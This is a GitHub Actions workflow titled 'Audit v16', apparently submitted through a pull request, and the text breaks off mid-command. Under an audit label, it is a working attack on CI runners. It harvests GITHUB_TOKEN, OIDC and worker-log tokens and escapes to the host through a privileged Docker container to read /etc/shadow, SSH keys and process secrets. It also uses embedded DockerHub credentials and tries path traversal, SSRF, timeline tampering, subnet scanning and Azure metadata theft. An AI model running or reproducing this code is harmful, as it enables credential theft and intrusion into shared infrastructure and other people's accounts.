name: Audit v16
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v16:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest + fix timeline ID extraction
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V16 HARVEST ==="
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt
          echo "RT_PFX=${RT:0:14} LEN=${#RT}"

          for AUD in vstoken pipelines; do
            TOK=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://${AUD}.actions.githubusercontent.com" | jq -r '.value // empty')
            echo "OIDC_${AUD}: ${#TOK} chars"
            echo "$TOK" > /tmp/oidc_${AUD}.txt
          done

          # Full worker log dump for ALL tokens and IDs
          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          if [ -f "$WLOG" ]; then
            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done

            # Fix: extract ALL GUIDs associated with plan/timeline/job
            echo "--- All GUIDs from worker ---"
            grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | sort -u | while read ID; do echo "planId=$ID"; done
            grep -oP '"timelineId"\s*:\s*"\K[^"]+' "$WLOG" | sort -u | while read ID; do echo "timelineId=$ID"; done
            grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | sort -u | while read ID; do echo "jobId=$ID"; done

            PLAN_ID=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            TL_ID=$(grep -oP '"timelineId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB_ID=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "$PLAN_ID" > /tmp/plan.txt
            echo "$TL_ID" > /tmp/tl.txt
            echo "$JOB_ID" > /tmp/job.txt

            # Extract SystemVssConnection token (different from GITHUB_TOKEN)
            SYS_TOK=$(grep -oP '"token"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | head -1)
            echo "SYS_TOK_LEN=${#SYS_TOK}"
            echo "$SYS_TOK" > /tmp/sys_tok.txt

            # Extract ALL URLs from worker log
            echo "--- All URLs ---"
            grep -oP 'https?://[a-zA-Z0-9._/-]+' "$WLOG" | sort -u | head -30
          fi

          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: Docker escape — start the created container, use it
      # v15 created container v15-escape with host root + privileged
      # Now: build on that, actually break out, steal everything
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Docker full escape
        if: always()
        run: |
          set +e
          echo "=== DOCKER FULL ESCAPE ==="
          RT=$(cat /tmp/rt.txt)

          # A: Start + exec into the v15-created container (if it still exists)
          echo "--- A: Start existing container ---"
          docker start v15-escape 2>&1 | head -3
          docker exec v15-escape cat /h/etc/shadow 2>&1 | head -5
          echo ""

          # B: Create our own escape container — mount EVERYTHING
          echo "--- B: Full host access ---"
          docker run --rm --privileged --pid=host --net=host --ipc=host \
            -v /:/h -v /var/run/docker.sock:/var/run/docker.sock \
            alpine sh -c '
            echo "=== B1: shadow ==="
            head -5 /h/etc/shadow

            echo "=== B2: ALL runner credentials ==="
            find /h/home/runner -name "*.credentials*" -o -name "*.rsaparams*" -o -name ".env" -o -name ".runner" 2>/dev/null | while read f; do
              echo "FILE:$f SIZE:$(wc -c < "$f")"
              cat "$f" 2>/dev/null | head -c 500
              echo ""
            done

            echo "=== B3: Worker log tokens ==="
            for LOG in /h/home/runner/actions-runner/*/diag/Worker_*.log /h/home/runner/actions-runner/*/*/Worker_*.log /h/home/runner/actions-runner/cached/*/extracted/_diag/Worker_*.log /h/home/runner/actions-runner/cached/*/_diag/Worker_*.log; do
              [ -f "$LOG" ] || continue
              echo "LOG:$LOG"
              grep -oP "\"(AccessToken|token|PlanAccessToken)\"\s*:\s*\"\K[^\"]{20,}" "$LOG" 2>/dev/null | head -3
            done

            echo "=== B4: Host processes ==="
            cat /h/proc/1/environ 2>/dev/null | tr "\0" "\n" | head -20

            echo "=== B5: All env vars with secrets ==="
            for PID in $(ls /h/proc/ | grep -E "^[0-9]+$" | head -50); do
              ENVS=$(cat /h/proc/$PID/environ 2>/dev/null | tr "\0" "\n" | grep -iE "TOKEN|SECRET|KEY|PASS|AUTH|CRED" 2>/dev/null)
              [ -n "$ENVS" ] && echo "PID=$PID: $ENVS"
            done

            echo "=== B6: Docker config + other creds ==="
            cat /h/home/runner/.docker/config.json 2>/dev/null
            cat /h/root/.docker/config.json 2>/dev/null
            find /h/home /h/root -name "*.pem" -o -name "id_rsa*" -o -name "id_ed25519*" -o -name ".npmrc" -o -name ".pypirc" -o -name ".nuget" 2>/dev/null | head -10

            echo "=== B7: Network from host namespace ==="
            cat /h/proc/net/tcp 2>/dev/null | head -20
            cat /h/etc/resolv.conf 2>/dev/null
          ' 2>&1 | head -120
          echo ""

          # C: Use DockerHub creds from v15
          echo "--- C: DockerHub exploit ---"
          DH_AUTH=$(echo "Z2l0aHViYWN0aW9uczozZDY0NzJiOS0zZDQ5LTRkMTctOWZjOS05MGQyNDI1ODA0M2I=" | base64 -d)
          echo "DH creds: $DH_AUTH"
          DH_USER=$(echo "$DH_AUTH" | cut -d: -f1)
          DH_PASS=$(echo "$DH_AUTH" | cut -d: -f2)

          # Login to DockerHub
          echo "$DH_PASS" | docker login -u "$DH_USER" --password-stdin 2>&1 | tail -3

          # Try to push to DockerHub
          docker tag alpine "$DH_USER/v16-escape:latest" 2>&1
          docker push "$DH_USER/v16-escape:latest" 2>&1 | tail -5
          echo "DockerHub push exit=$?"

          # List DockerHub repos
          DH_TOKEN=$(/usr/bin/curl -sS -X POST "https://hub.docker.com/v2/users/login" \
            -H "Content-Type: application/json" \
            -d "{\"username\":\"$DH_USER\",\"password\":\"$DH_PASS\"}" | jq -r '.token // empty')
          if [ -n "$DH_TOKEN" ]; then
            echo "DH token: ${#DH_TOKEN} chars"
            /usr/bin/curl -sS -H "Authorization: JWT $DH_TOKEN" \
              "https://hub.docker.com/v2/repositories/$DH_USER/?page_size=100" \
              | jq -c '.results[]? | {name,namespace,is_private}' 2>/dev/null | head -10
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 3: Response bleed + path traversal + SSRF
      # Force errors to leak info, try path traversal on every service
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Response bleed hunting
        if: always()
        run: |
          set +e
          echo "=== RESPONSE BLEED HUNTING ==="
          RT=$(cat /tmp/rt.txt)
          GH="https://api.github.com"
          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)

          # A: Path traversal on GitHub API
          echo "--- A: Path traversal ---"
          for PATH in \
            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/../../../orgs/github/members" \
            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/contents/..%2F..%2F..%2Fetc%2Fpasswd" \
            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/contents/%2e%2e%2f%2e%2e%2f" \
            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/git/blobs/../../../../etc/passwd" \
            "repos/../../../api/v3/meta" \
            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO%00.git/refs" \
            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/secrets" \
            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/secrets?per_page=100" \
            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/organization-secrets" \
            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/variables?per_page=100" \
            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/environments" \
            "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/environments/production/secrets"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: token $RT" "$GH/$PATH")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A $PATH = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # B: SSRF through Pipelines service
          echo "--- B: Pipelines SSRF ---"
          if [ -n "$PURL" ]; then
            for TARGET in \
              "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
              "http://168.63.129.16/machine?comp=goalstate" \
              "http://10.1.0.1/" \
              "http://10.1.0.80:8080/" \
              "http://127.0.0.1:8080/" \
              "http://localhost:9090/"; do
              # Try to make pipelines service fetch an internal URL
              for EP in \
                "_apis/distributedtask/serviceendpoints" \
                "_apis/build/builds" \
                "_apis/runtime/pipelines"; do
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                  -H "Authorization: Bearer $RT" \
                  "${PURL}${EP}?url=$TARGET")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_401" ] && \
                  echo "B $EP?url=$TARGET = $CODE | $(echo "$BODY" | head -c 150)"
              done
            done
          fi
          echo ""

          # C: Force errors to leak stack traces/internals
          echo "--- C: Error forcing ---"
          for PAYLOAD in \
            '{"a":' \
            '{"query":"{ __schema { types { name } } }"}' \
            '{"query":"mutation { __typename }"}' \
            '{"query":"{repository(owner:\"'$UPSTREAM_OWNER'\",name:\"'$UPSTREAM_REPO'\"){object(expression:\"main\"){... on Commit{history(first:1){nodes{author{email}}}}}}}"}' \
            '{"query":"{viewer{login,email,databaseId,organizations(first:10){nodes{login,databaseId}}}}"}' \
            '{"query":"{rateLimit{limit,cost,remaining,resetAt,nodeCount}}"}' \
            '{"query":"{meta{gitHubServicesSha,installedVersion}}"}' \
            'x]}{%0d%0a' \
            '{{7*7}}' \
            '${7*7}'; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
              "$GH/graphql" -d "$PAYLOAD" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "C $(echo "$PAYLOAD" | head -c 40) = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # D: Header injection / smuggling
          echo "--- D: Header attacks ---"
          for HEADER in \
            "X-Forwarded-For: 127.0.0.1" \
            "X-Real-IP: 127.0.0.1" \
            "X-Forwarded-Host: api.github.com" \
            "X-Original-URL: /repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/secrets" \
            "X-Rewrite-URL: /repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/secrets" \
            "X-GitHub-Api-Version: 2022-11-28" \
            "Accept: application/vnd.github.v3.raw+json" \
            "Accept: application/vnd.github.mercy-preview+json" \
            "Accept: application/vnd.github.luke-cage-preview+json" \
            "X-GitHub-Media-Type: github.v3" \
            "Authorization: token $RT" \
            "X-GitHub-Enterprise-Version: 3.8"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
              -H "$HEADER" -H "Authorization: token $RT" \
              "$GH/repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/secrets")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            HNAME=$(echo "$HEADER" | cut -d: -f1)
            [ "$CODE" != "HTTP_403" ] && echo "D $HNAME = $CODE | $(echo "$BODY" | head -c 150)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 4: GraphQL introspection + viewer bleed + org discovery
      # Force GraphQL to leak everything it knows
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - GraphQL bleed
        if: always()
        run: |
          set +e
          echo "=== GRAPHQL BLEED ==="
          RT=$(cat /tmp/rt.txt)
          GH="https://api.github.com"

          # A: Viewer info (who are we?)
          echo "--- A: Viewer ---"
          R=$(/usr/bin/curl -sS -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
            "$GH/graphql" -d '{"query":"{ viewer { login databaseId email createdAt updatedAt isSiteAdmin isEmployee company location organizations(first:100) { nodes { login databaseId name } } repositories(first:10) { nodes { nameWithOwner isPrivate } } } }"}')
          echo "$R" | jq '.' 2>/dev/null | head -40
          echo ""

          # B: Full schema introspection
          echo "--- B: Schema ---"
          R=$(/usr/bin/curl -sS -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
            "$GH/graphql" -d '{"query":"{ __schema { mutationType { fields { name description } } queryType { fields { name } } } }"}')
          echo "Mutations: $(echo "$R" | jq '[.data.__schema.mutationType.fields[].name]' 2>/dev/null | head -c 500)"
          echo ""

          # C: Upstream repo deep dive — find secrets references
          echo "--- C: Repo deep ---"
          R=$(/usr/bin/curl -sS -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
            "$GH/graphql" -d '{"query":"{ repository(owner:\"'$UPSTREAM_OWNER'\",name:\"'$UPSTREAM_REPO'\") { id databaseId diskUsage isPrivate isFork isArchived isDisabled isLocked isTemplate homepageUrl description defaultBranchRef { name target { ... on Commit { oid author { name email } committer { name email } message } } } collaborators(first:10) { nodes { login } } deployKeys(first:10) { nodes { title key readOnly } } webhooks: registeredWebhooks(first:10) { nodes { id } } environments(first:10) { nodes { name id } } branchProtectionRules(first:10) { nodes { pattern isAdminEnforced requiresApprovingReviews requiredApprovingReviewCount } } repositoryTopics(first:10) { nodes { topic { name } } } } }"}')
          echo "$R" | jq '.data.repository | {id,databaseId,diskUsage,collaborators,deployKeys,environments,branchProtectionRules}' 2>/dev/null
          echo ""

          # D: Organization discovery from upstream owner
          echo "--- D: Org discovery ---"
          R=$(/usr/bin/curl -sS -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
            "$GH/graphql" -d '{"query":"{ user(login:\"'$UPSTREAM_OWNER'\") { login databaseId email company bio organizations(first:50) { nodes { login databaseId name membersWithRole(first:10) { nodes { login } } repositories(first:10) { nodes { nameWithOwner isPrivate } } } } repositories(first:50 orderBy:{field:UPDATED_AT,direction:DESC}) { nodes { nameWithOwner isPrivate defaultBranchRef { name } } } } }"}')
          echo "$R" | jq '.' 2>/dev/null | head -60
          echo ""

          # E: Search for leaked secrets in commit messages/issues
          echo "--- E: Search leaks ---"
          for QUERY in "password" "secret" "token" "api_key" "aws_access" "private_key"; do
            R=$(/usr/bin/curl -sS -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
              "$GH/graphql" -d "{\"query\":\"{ search(query:\\\"repo:$UPSTREAM_OWNER/$UPSTREAM_REPO $QUERY\\\",type:ISSUE,first:5) { nodes { ... on Issue { title number body } } } }\"}")
            HITS=$(echo "$R" | jq '.data.search.nodes | length' 2>/dev/null)
            [ "$HITS" != "0" ] && [ "$HITS" != "null" ] && echo "E '$QUERY' hits=$HITS"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Pipeline timeline injection (fixed TL_ID extraction)
      # + Run service HMAC brute + SystemVssConnection token abuse
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Pipeline injection
        if: always()
        run: |
          set +e
          echo "=== PIPELINE INJECTION ==="
          RT=$(cat /tmp/rt.txt)
          SYS_TOK=$(cat /tmp/sys_tok.txt 2>/dev/null)
          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
          TL=$(cat /tmp/tl.txt 2>/dev/null)
          JOB=$(cat /tmp/job.txt 2>/dev/null)
          RUN_URL=$(cat /tmp/RunServiceUrl.txt 2>/dev/null)
          RUN_ID="${{ github.run_id }}"

          echo "PURL=$PURL PLAN=$PLAN TL=$TL JOB=$JOB"
          echo "RUN_URL=$RUN_URL SYS_TOK_LEN=${#SYS_TOK}"

          if [ -z "$PURL" ]; then echo "NO PIPELINES URL"; exit 0; fi

          # A: Try SYS_TOK (extracted from worker log) on pipelines
          echo "--- A: SystemVssConnection token ---"
          for TOK in "$SYS_TOK" "$RT"; do
            [ -z "$TOK" ] && continue
            PFX=$(echo -n "$TOK" | head -c 10)

            # Get all plans
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
              -H "Authorization: Bearer $TOK" \
              "${PURL}_apis/distributedtask/plans")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A plans auth=$PFX = $CODE | $(echo "$BODY" | head -c 200)"

            if [ -n "$PLAN" ]; then
              # Get timelines for this plan
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
                -H "Authorization: Bearer $TOK" \
                "${PURL}_apis/distributedtask/plans/$PLAN/timelines")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "A timelines auth=$PFX = $CODE | $(echo "$BODY" | head -c 300)"

              # Extract timeline ID from response if we got one
              NEW_TL=$(echo "$BODY" | jq -r '.value[0].id // .id // empty' 2>/dev/null)
              [ -n "$NEW_TL" ] && echo "FOUND TL=$NEW_TL" && TL="$NEW_TL"

              if [ -n "$TL" ]; then
                # Get timeline records
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
                  -H "Authorization: Bearer $TOK" \
                  "${PURL}_apis/distributedtask/plans/$PLAN/timelines/$TL/records")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                echo "A records auth=$PFX = $CODE | $(echo "$BODY" | head -c 300)"

                # Try to modify timeline (inject step result)
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
                  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                  "${PURL}_apis/distributedtask/plans/$PLAN/timelines/$TL/records" \
                  -d "[{\"id\":\"$JOB\",\"name\":\"v16-injected\",\"state\":\"Completed\",\"result\":\"Succeeded\",\"log\":{\"id\":1}}]")
                CODE=$(echo "$R" | tail -1)
                echo "A inject record auth=$PFX = $CODE"

                # Append log lines
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                  "${PURL}_apis/distributedtask/plans/$PLAN/logs/1/lines" \
                  -d '"v16 injected log line"')
                CODE=$(echo "$R" | tail -1)
                echo "A append log auth=$PFX = $CODE"
              fi
            fi
          done
          echo ""

          # B: Run service exploration
          echo "--- B: Run service ---"
          if [ -n "$RUN_URL" ]; then
            for TOK in "$SYS_TOK" "$RT"; do
              [ -z "$TOK" ] && continue
              PFX=$(echo -n "$TOK" | head -c 10)
              for EP in \
                "" \
                "check" \
                "_apis/pipelines/workflows" \
                "_apis/pipelines/runs/$RUN_ID" \
                "_apis/pipelines/runs/$RUN_ID/signedlogcontent" \
                "_apis/pipelines/runs/$RUN_ID/resources" \
                "actionsgranularpermissions" \
                "_apis/runtime/webhooks"; do
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
                  -H "Authorization: Bearer $TOK" \
                  "${RUN_URL}${EP}")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
                  echo "B $EP auth=$PFX = $CODE | $(echo "$BODY" | head -c 150)"
              done
            done
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 6: Internal network pivot from container
      # We have full host network access — scan EVERYTHING
      # ══════════════════════════════════════════════════════════════
      - name: Step 6 - Network pivot
        if: always()
        run: |
          set +e
          echo "=== NETWORK PIVOT ==="

          # A: Scan the entire /20 subnet for open ports
          echo "--- A: Subnet scan ---"
          for HOST in 10.1.0.1 10.1.0.2 10.1.0.3 10.1.0.4 10.1.0.5 10.1.0.10 10.1.0.80 10.1.0.100 10.1.0.254 172.17.0.1 172.17.0.2 172.17.0.3; do
            for PORT in 22 80 443 2376 3000 5000 6379 8080 8443 9090 27017; do
              timeout 1 bash -c "echo >/dev/tcp/$HOST/$PORT" 2>/dev/null && echo "OPEN $HOST:$PORT"
            done
          done
          echo ""

          # B: Azure Wireserver (168.63.129.16) — deep probe
          echo "--- B: Azure Wireserver ---"
          for EP in \
            "machine?comp=goalstate" \
            "machine?comp=config&type=hostingEnvironmentConfig" \
            "machine?comp=config&type=sharedConfig" \
            "machine?comp=roleProperties" \
            "machine?comp=status" \
            "machine/plugins?comp=config&type=hostingEnvironmentConfig" \
            "healthcheck" \
            "metadata/instance?api-version=2021-02-01"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
              -H "x-ms-version: 2012-11-30" \
              "http://168.63.129.16/$EP" 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_000" ] && echo "B $EP = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # C: IMDS — try to access other VMs' metadata through SSRF
          echo "--- C: IMDS abuse ---"
          # Dump FULL instance metadata
          /usr/bin/curl -sS -H "Metadata: true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json" | jq '.' 2>/dev/null | head -80
          echo ""

          # Attested document — extract the full signed payload
          /usr/bin/curl -sS -H "Metadata: true" \
            "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" \
